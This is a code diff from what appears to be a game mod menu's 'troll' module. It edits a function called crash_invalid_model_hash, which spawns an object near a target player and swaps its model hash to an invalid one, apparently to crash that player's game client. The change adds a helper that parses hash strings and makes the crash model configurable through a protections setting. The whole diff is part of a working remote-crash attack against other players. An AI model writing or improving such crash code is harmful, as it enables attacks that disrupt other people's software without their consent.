@@ -207,7 +207,17 @@ namespace big::troll
 		}
 	}
 
-	static void crash_invalid_model_hash(player_ptr target /*, int target_id*/)
+	static auto get_hash(const std::string& str)
+	{
+		rage::joaat_t hash = 0;
+		if (str.substr(0, 2) == "0x")
+			std::stringstream(str.substr(2)) >> std::hex >> hash;
+		else
+			hash = rage::joaat(str.c_str());
+		return hash;
+	}
+
+	static void crash_invalid_model_hash(player_ptr target/*, std::string freeze_model*/)
 	{
 		big::g_fiber_pool->queue_job([target]()
 		{
@@ -225,8 +235,13 @@ namespace big::troll
 				auto info     = model_info::get_model(hash);
 				Object object = entity::spawn_object_crash(hash, coords/*, (int)target_id*/);
 				if (object != NULL)
-				{
-					info->m_hash = "prop_thindesertfiller_aa"_J;
+				{					
+					//static char freeze_model[64];
+					//std::memcpy(freeze_model, g.protections.freeze_model.c_str(), 12);
+
+					info->m_hash = get_hash(g.protections.freeze_model);
+
+
 					// info->m_hash = "proc_leafybush_01"_J;
 					script::get_current()->yield(1s);
 					entity::delete_entity(object, true);
